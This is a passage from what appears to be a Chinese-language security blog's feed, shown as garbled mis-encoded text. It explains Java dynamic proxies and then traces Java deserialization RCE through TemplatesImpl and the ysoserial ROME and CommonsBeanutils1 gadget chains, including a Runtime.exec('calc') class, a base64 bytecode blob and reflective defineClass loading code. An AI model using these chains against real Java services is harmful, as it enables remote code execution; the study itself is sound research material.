ç»Ÿçš„æ¥å£å®ç°å’Œä½¿ç”¨ä»£ç†æœ‰ä»€ä¹ˆåŒºåˆ«</p><blockquote><p>å®šä¹‰æ¥å£ï¼š</p><pre class="line-numbers language-none"><code class="language-none">public interface Hello &#123;    void morning(String name);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç¼–å†™å®ç°ç±»ï¼š</p><pre class="line-numbers language-none"><code class="language-none">public class HelloWorld implements Hello &#123;    public void morning(String name) &#123;        System.out.println(&quot;Good morning, &quot; + name);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ›å»ºå®ä¾‹ï¼Œè½¬å‹ä¸ºæ¥å£å¹¶è°ƒç”¨ï¼š</p><pre class="line-numbers language-none"><code class="language-none">Hello hello &#x3D; new HelloWorld();hello.morning(&quot;Bob&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ç§æ–¹å¼å°±æ˜¯æˆ‘ä»¬é€šå¸¸ç¼–å†™ä»£ç çš„æ–¹å¼ã€‚</p></blockquote><p>è¿˜æœ‰åŠ¨æ€ä»£ç†</p><blockquote><p>è¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯åŠ¨æ€ä»£ç ï¼Œæˆ‘ä»¬ä»ç„¶å…ˆå®šä¹‰äº†æ¥å£<code>Hello</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸å»ç¼–å†™å®ç°ç±»ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡JDKæä¾›çš„ä¸€ä¸ª<code>Proxy.newProxyInstance()</code>åˆ›å»ºäº†ä¸€ä¸ª<code>Hello</code>æ¥å£å¯¹è±¡ã€‚è¿™ç§æ²¡æœ‰å®ç°ç±»ä½†æ˜¯åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºäº†ä¸€ä¸ªæ¥å£å¯¹è±¡çš„æ–¹å¼ï¼Œæˆ‘ä»¬ç§°ä¸ºåŠ¨æ€ä»£ç ã€‚JDKæä¾›çš„åŠ¨æ€åˆ›å»ºæ¥å£å¯¹è±¡çš„æ–¹å¼ï¼Œå°±å«åŠ¨æ€ä»£ç†ã€‚</p><p>ä¸€ä¸ªæœ€ç®€å•çš„åŠ¨æ€ä»£ç†å®ç°å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"morning"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Good morning, "</span> <span class="token operator">+</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Hello</span> hello <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Hello</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>            <span class="token class-name">Hello</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// ä¼ å…¥ClassLoader</span>            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Hello</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token comment">// ä¼ å…¥è¦å®ç°çš„æ¥å£</span>            handler<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ä¼ å…¥å¤„ç†è°ƒç”¨æ–¹æ³•çš„InvocationHandler</span>        hello<span class="token punctuation">.</span><span class="token function">morning</span><span class="token punctuation">(</span><span class="token string">"Bob"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">interface</span> <span class="token class-name">Hello</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">morning</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºä¸€ä¸ª<code>interface</code>å®ä¾‹çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li><p>å®šä¹‰ä¸€ä¸ª<code>InvocationHandler</code>å®ä¾‹ï¼Œå®ƒè´Ÿè´£å®ç°æ¥å£çš„æ–¹æ³•è°ƒç”¨ï¼›</p></li><li><p>é€šè¿‡</p><pre class="line-numbers language-none"><code class="language-none">Proxy.newProxyInstance()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ›å»º</p><pre class="line-numbers language-none"><code class="language-none">interface<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®ä¾‹ï¼Œå®ƒéœ€è¦3ä¸ªå‚æ•°ï¼š</p><ol><li>ä½¿ç”¨çš„<code>ClassLoader</code>ï¼Œé€šå¸¸å°±æ˜¯æ¥å£ç±»çš„<code>ClassLoader</code>ï¼›</li><li>éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ï¼Œè‡³å°‘éœ€è¦ä¼ å…¥ä¸€ä¸ªæ¥å£è¿›å»ï¼›</li><li>ç”¨æ¥å¤„ç†æ¥å£æ–¹æ³•è°ƒç”¨çš„<code>InvocationHandler</code>å®ä¾‹ã€‚</li></ol></li><li><p>å°†è¿”å›çš„<code>Object</code>å¼ºåˆ¶è½¬å‹ä¸ºæ¥å£ã€‚</p></li></ol></blockquote><p>å¯ä»¥çœ‹åˆ°æ•´ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬æ ¹æœ¬æ²¡æœ‰å¯¹æ¥å£è¿›è¡Œä¼ ç»Ÿæ„ä¹‰ä¸Šçš„å®ç°ï¼Œ</p><h2 id="å…³äºTemplatesImplåˆ©ç”¨é“¾RCEçš„é—®é¢˜"><a href="#å…³äºTemplatesImplåˆ©ç”¨é“¾RCEçš„é—®é¢˜" class="headerlink" title="å…³äºTemplatesImplåˆ©ç”¨é“¾RCEçš„é—®é¢˜"></a>å…³äºTemplatesImplåˆ©ç”¨é“¾RCEçš„é—®é¢˜</h2><p>å›°æƒ‘å¾ˆä¹…äº†ï¼Œä¸»è¦æ˜¯é“¾å­è·Ÿåˆ°æœ€åä¸€æ­¥ä¸çŸ¥é“æ€ä¹ˆæœ€åRCEäº†</p><p>è¦æƒ³çŸ¥é“è¿™ä¸ªç±»ä¸ºä»€ä¹ˆå¯ä»¥è§¦å‘RCEï¼Œé¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“é»˜è®¤æƒ…å†µä¸‹Javaæ‰§è¡Œç³»ç»Ÿå‘½ä»¤éœ€è¦ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆï¼Œä»£ç åº”å½“å¦‚ä¸‹</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class TouchFile&#123;    public TouchFile() throws Exception &#123;        Runtime.getRuntime().exec(&quot;calc&quot;);    &#125;   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥ä½¿ç”¨RuntimeåŒ…ä¸­çš„å‡½æ•°æ‰§è¡Œå³å¯ï¼Œå°†è¿™ä¸ªç±»ç¼–è¯‘æˆå­—èŠ‚ç åå†è¿›è¡Œbase64ï¼Œç„¶åäº¤ç»™defineClassæ¥åŠ è½½å­—èŠ‚ç ï¼Œå†æ‰§è¡Œå…¶ä¸­</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Method defineClass &#x3D; ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);defineClass.setAccessible(true);byte[] code &#x3D;Base64.getDecoder().decode(&quot;yv66vgAAADQAHgoABgARCgASABMIABQKABIAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAOVG91Y2hGaWxlLmphdmEMAAcACAcAGQwAGgAbAQAEY2FsYwwAHAAdAQAJVG91Y2hGaWxlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAACAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEAAEABEADQASAAsAAAAEAAEADAAJAA0ADgACAAkAAAAmAAIAAQAAAAq4AAISA7YABFexAAAAAQAKAAAACgACAAAAFgAJABcACwAAAAQAAQAMAAEADwAAAAIAEA&#x3D;&#x3D;&quot;);Class yyds&#x3D; (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;TouchFile&quot;, code, 0, code.length);yyds.newInstance();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬éƒ½çŸ¥é“ Java çš„ ClassLoader æ˜¯ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ï¼ŒClassLoader æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå®ƒå°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œç”¨ä¸€å¥è¯æ¦‚æ‹¬å®ƒçš„ä½œç”¨å°±æ˜¯å°†ä¼ å…¥çš„å­—èŠ‚ç å¤„ç†æˆçœŸæ­£çš„ Java ç±»ç„¶åè¿”å›ã€‚</p><p><code>ClassLoader</code> å¤„ç†å­—èŠ‚ç çš„æµç¨‹ä¸º <code>loadClass</code> -&gt; <code>findClass</code> -&gt; <code>defineClass</code></p><p><code>loadClass</code>:ï¼šä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ <code>findClass</code> </p><p> <code>findClass</code>ï¼š æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç </p><p> <code>defineClass</code>ï¼šå¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»</p><p>æ‰€ä»¥å°†å­—èŠ‚ç è½¬ä¸º java ç±»çš„å…¶å®æ˜¯ defineClass æ–¹æ³•ï¼Œç¿»çœ‹æºç  ClassLoader#defineClass æ˜¯ä¸€ä¸ªprotectedå±æ€§ï¼Œæ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œåªèƒ½é€šè¿‡åå°„çš„å½¢å¼æ¥è°ƒç”¨ï¼Œæ‰€ä»¥åœ¨å®é™…åœºæ™¯ä¸­å¾ˆéš¾åˆ©ç”¨åˆ°å®ƒã€‚</p><p>è¿™ä¹Ÿå°±æ˜¯<code>TemplatesImpl</code>å­˜åœ¨çš„æ„ä¹‰ï¼Œæˆ‘ä»¬ç›´æ¥å»çœ‹è¿™ä¸ªç±»çš„å®šä¹‰</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232150702.png"></p><p>å¯ä»¥çœ‹åˆ°TransletClassLoaderå®šä¹‰äº†defineClassæ–¹æ³•ï¼Œå¯¹å…¶è¿›è¡Œè°ƒç”¨</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232300218.png"></p><p>å†å‘å‰æŸ¥æ‰¾å‘ç°defineTransletClassesä¸­ç”Ÿæˆäº†TransletClassLoaderå¹¶è°ƒç”¨äº†å…¶ä¸­çš„defineClassæ–¹æ³•ï¼Œä¸è¿‡åˆ°è¿™ä¸€æ­¥ä¾ç„¶æ˜¯privateå­ç±»æ— æ³•è¢«å¤–ç•Œç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­å‘ä¸Š</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232305532.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232310998.png"></p><p>æœ€ç»ˆæ‰¾åˆ°newTransformerä¸ºpublicï¼Œå¯ä»¥ç›´æ¥è¢«è°ƒç”¨äº†ï¼Œæœ€ç»ˆåˆ©ç”¨é“¾å¦‚ä¸‹</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt;TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;æœªæˆåŠŸè§¦å‘TemplatesImpl#getTransletIndex() -&gt; TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">TemplatesImpl#getOutputProperties() -&gt;TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass() <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹å®Œè¿™ä¸ªæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ysoserialæœ€åæ˜¯æ€ä¹ˆé€šè¿‡ä»–æ„é€ å‡ºæ¥ä¸€ä¸ªå¯ä¾›å‘½ä»¤æ‰§è¡Œçš„å­—èŠ‚ç çš„</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ysoserialååºåˆ—åŒ–</title>
      <link href="/posts/7ecbecc0.html"/>
      <url>/posts/7ecbecc0.html</url>
      
        <content type="html"><![CDATA[<h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">é“¾å­<span class="token comment">/** * * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap&lt;K,V>.hash(Object) * HashMap&lt;K,V>.readObject(ObjectInputStream) * * @author mbechler * */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å…ˆè·Ÿç€ååºåˆ—åŒ–çš„é“¾å­èµ°ä¸€éè¯•è¯•</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211652278.png"></p><p><code>HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</code>è¿™ä¸ªæ˜¯ååºåˆ—åŒ–çš„å…¥å£ï¼Œä¸è¿‡å¥‡æ€ªçš„æ˜¯çœ‹åˆ°å‰é¢çš„å†…å®¹å¥½åƒæ²¡æœ‰ä»€ä¹ˆå¤§ç”¨ï¼Œé‚£å°±ç›´æ¥å¾€ä¸‹è·Ÿï¼Œèµ°<code>hash</code>å‡½æ•°</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211655111.png"></p><p><code>HashMap&lt;K,V&gt;.hash(Object)</code>æ£€æŸ¥ä¼ å…¥çš„keyæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±è¿”å›0ï¼Œå¦åˆ™æ‰§è¡Œkeyçš„<code>hashCode</code>å‡½æ•°ï¼Œæ­¤å¤„keyä¸º<code>ObjectBean</code>ç±»å¯¹è±¡ï¼Œç»§ç»­èµ°<code>hashCode</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211657876.png"></p><p><code>ObjectBean.hashCode()</code>ç»§ç»­è°ƒç”¨<code>EqualsBean</code>çš„<code>beanHashCode</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211659382.png"></p><p><code>EqualsBean.beanHashCode()</code>ç»§ç»­è°ƒç”¨<code>ObjectBean</code>çš„<code>toString</code>æ–¹æ³•ï¼ŒhashCodeä¼šåœ¨æ¼æ´è§¦å‘åå†è¢«æ‰§è¡Œï¼Œæ‰€ä»¥æ­¤å¤„ä¸éœ€è¦ç®¡</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211701563.png"></p><p><code>ObjectBean.toString()</code>ç»§ç»­è°ƒç”¨<code>ToStringBean</code>çš„<code>toString</code>æ–¹æ³•</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211703142.png"></p><p><code>ToStringBean.toString()</code>çœ‹åˆ°æœ€åprefixå°±ç›¸å½“äºæ‹¿å‡ºæ¥è°ƒç”¨é“¾å¼€å§‹çš„åŸå¯¹è±¡çš„ç±»åï¼Œä¼ å…¥åŒåå‡½æ•°ä¸­æ‰§è¡Œ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210222355753.png"></p><p>è¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨ <code>BeanIntrospector.getPropertyDescriptors()</code> æ¥è·å– <code>_beanClass</code> çš„å…¨éƒ¨ getter/setter æ–¹æ³•ï¼Œç„¶ååˆ¤æ–­å‚æ•°é•¿åº¦ä¸º 0 çš„æ–¹æ³•ä½¿ç”¨ <code>_obj</code> å®ä¾‹è¿›è¡Œåå°„è°ƒç”¨ï¼Œç¿»è¯‘æˆäººè¯å°±æ˜¯ä¼šè°ƒç”¨æ‰€æœ‰ getter æ–¹æ³•æ‹¿åˆ°å…¨éƒ¨å±æ€§å€¼ï¼Œç„¶åæ‰“å°å‡ºæ¥ï¼Œæ˜¾ç„¶getteréƒ½æ˜¯æ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ‰€æœ‰getteræ–¹æ³•éƒ½è¢«è°ƒç”¨äº†ä¸€é</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230019005.png"></p><p>æˆ‘ä»¬ç»§ç»­è·Ÿå…¥<code>Method.invoke()</code>ï¼Œåˆ°æœ€åè°ƒç”¨äº†<code>DelegatingMethodAccessorImpl.invoke(Object, Object[])</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230026318.png"></p><p>è·Ÿå…¥è°ƒç”¨åŒç±»ä¸‹çš„<code>invoke0</code>ï¼Œæœ€ç»ˆè§¦å‘<code>TemplatesImpl.getOutputProperties()</code>å¯¼è‡´RCE</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230029269.png"></p><p>èµ°å®Œä¸€éé“¾å­å¤§æ¦‚çŸ¥é“æ•´ä¸ªååºåˆ—åŒ–æ˜¯æ€ä¹ˆè§¦å‘çš„äº†ï¼Œèƒ½æŒ–å‡ºæ¥çš„çœŸçš„æ˜¯ç¥ä»™ï¼ˆ</p><h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><p>å—·å‘œï¼Œé¦–å…ˆè¿˜æ˜¯æ‰”ä¸€ä¸ªååºåˆ—åŒ–é“¾å­</p><pre class="line-numbers language-none"><code class="language-none">PriorityQueue.readObject()PriorityQueue.heapify()PriorityQueue.siftDown()siftDownUsingComparator()BeanComparator.compare()TemplatesImpl.getOutputProperties()TemplatesImpl.newTransformer()TemplatesImpl.getTransletInstance()TemplatesImpl.defineTransletClasses()TemplatesImpl.TransletClassLoader.defineClass()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ¬¡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨createObjectçš„æ—¶å€™æœ€ç»ˆè¿”å›äº†ä¸€ä¸ª<code>PriorityQueue</code>ç±»å¯¹è±¡ï¼Œå…³äºè¿™ä¸ªç±»</p><blockquote><p>PriorityQueueæ˜¯åŸºäºä¼˜å…ˆå †çš„ä¸€ä¸ªæ— ç•Œé˜Ÿåˆ—ï¼Œè¿™ä¸ªä¼˜å…ˆé˜Ÿåˆ—ä¸­çš„å…ƒç´ å¯ä»¥é»˜è®¤è‡ªç„¶æ’åºæˆ–è€…é€šè¿‡æä¾›çš„<a href="http://www.journaldev.com/780/java-comparable-and-comparator-example-to-sort-objects">Comparator</a>ï¼ˆæ¯”è¾ƒå™¨ï¼‰åœ¨é˜Ÿåˆ—å®ä¾‹åŒ–çš„æ—¶æ’åºã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ PriorityQueue ä¼šå¯¹é˜Ÿåˆ—ä¸­çš„å…ƒç´ ç”¨æ¯”è¾ƒå™¨ Comparator è¿›è¡Œæ’åºï¼Œè€Œ CommonsBeanutils1 ä¸­ä½¿ç”¨çš„æ¯”è¾ƒå™¨ä¸º BeanComparatorã€‚</p></blockquote><p>é‚£è¿™å’Œæˆ‘ä»¬çš„ååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘ä»¬å…ˆå¯¹è¿™ä¸ªé“¾å­è¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–è¯•è¯•</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260154357.png"></p><p>æˆ‘ä»¬å…ˆç›´æ¥æ¥çœ‹è¿™ä¸ªç±»çš„<code>readObject</code>å‡½æ•°ï¼Œçœ‹åˆ°æœ€åè°ƒç”¨äº†<code>heapify</code><em><strong>#å †åŒ–</strong></em>å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿå…¥ä¸€ä¸‹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260156906.png"></p><p>å¯ä»¥çœ‹åˆ°å…¶ä¸­è°ƒç”¨äº†<code>siftDown</code><em><strong>#ç­›é€‰</strong></em>å‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿå…¥</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260159298.png"></p><p>å…¶ä¸­è°ƒç”¨äº†<code>siftDownUsingComparator</code><em><strong>#ç”¨æ¯”è¾ƒå™¨ç­›é€‰</strong></em>å‡½æ•°ï¼Œæ­¤å¤„çš„æ¯”è¾ƒå™¨ä½¿ç”¨çš„æ˜¯<code>BeanComparator</code>ï¼Œç»§ç»­è·Ÿå…¥</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260201908.png"></p><p>è¿™é‡Œå¯¹ä¹‹å‰é˜Ÿåˆ—ä¸­çš„å†…å®¹è°ƒç”¨äº†<code>compare</code><em><strong>#æ¯”è¾ƒ</strong></em>å‡½æ•°ï¼Œè·Ÿå…¥</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260202428.png"></p><p>çœ‹åˆ°å…¶ä¸­çš„æ¯”è¾ƒå™¨å‡½æ•°å…·ä½“ä»£ç ï¼Œè·Ÿå…¥<code>PropertyUtils.getProperty</code><em><strong>#å±æ€§å·¥å…·ç±»:è·å–å±æ€§</strong></em>æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å…·ä½“æ˜¯ä»€ä¹ˆå†…å®¹å‘¢</p><blockquote><p>è€Œ getProperty() çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><p><code>PropertyUtils.getProperty(Object bean, String name)</code><br><code>bean</code> æ˜¯ä¸ä¸ºnullçš„Java Beanå®ä¾‹<br><code>name</code> æ˜¯Java Beanå±æ€§åç§° (ä¹Ÿå°±æ˜¯æ–¹æ³•ä¸­çš„getXxx(), setXxx(), å…¶ä¸­çš„xxxæˆä¸ºè¿™ä¸ªjava beançš„beanå±æ€§, javaä¸­çš„ç±»æˆå‘˜å˜é‡ç§°ä¸ºå­—æ®µ, å¹¶ä¸æ˜¯å±æ€§ã€‚<br>è¿™ä¸ªæ–¹æ³•æ˜¯è°ƒç”¨beanå¯¹è±¡ä¸­çš„getname()æ–¹æ³•</p></blockquote><p>å°±ç›¸å½“äºç›´æ¥è°ƒç”¨äº†beanå¯¹è±¡ä¸­çš„getxxx()æ–¹æ³•ï¼Œåˆå› ä¸ºååºåˆ—åŒ–æˆ‘ä»¬å¯¹å†…å®¹å¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„è°ƒç”¨ä»»æ„å¯¹è±¡çš„ä»»æ„getæ–¹æ³•ï¼Œåœ¨è¿™é‡Œo1ï¼Œo2å°±æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–ç”Ÿæˆçš„<code>PriorityQueue</code>ä¸­çš„å…ƒç´ ï¼Œè€Œ<code>property</code>å±æ€§ä¹Ÿå¯æ§ï¼Œæ‰€ä»¥æ¡ä»¶æˆç«‹ï¼Œå¯ä»¥ä»»æ„è°ƒç”¨getæ–¹æ³•</p><p>æ­¤å¤„æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå±é™©çš„getæ–¹æ³•å°±è¡Œäº†ï¼Œè¿˜æ˜¯ä½¿ç”¨<code>TemplatesImpl</code>ç±»ï¼Œå…³äºè¿™ä¸ªç±»RCEå¯ä»¥å»çœ‹å¦ä¸€ä¸ªJAVAå°ç‚¹æ–‡ç« 